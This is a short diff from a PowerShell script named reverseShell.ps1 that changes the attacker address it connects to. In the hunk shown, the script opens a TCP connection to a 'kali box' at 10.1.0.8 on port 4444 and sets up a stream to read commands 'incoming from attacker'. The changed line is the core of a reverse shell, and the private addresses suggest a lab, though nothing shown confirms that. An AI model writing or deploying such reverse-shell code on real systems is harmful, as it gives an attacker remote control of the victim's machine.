@@ -7,7 +7,7 @@ $scriptPath = Join-Path -path $PSScriptRoot -ChildPath reverseShell.ps1
 Start-Sleep -Seconds 15
 #establishes connection to kali box
 #.tcpClient takes string attackerip, portnumber
-$client = New-Object System.Net.Sockets.TcpClient("192.168.192.32", 4444)
+$client = New-Object System.Net.Sockets.TcpClient("10.1.0.8", 4444)
 #gets the network stream in a readable/writeable form
 $stream = $client.GetStream()
 #sets up reader (reads data incoming from attacker)
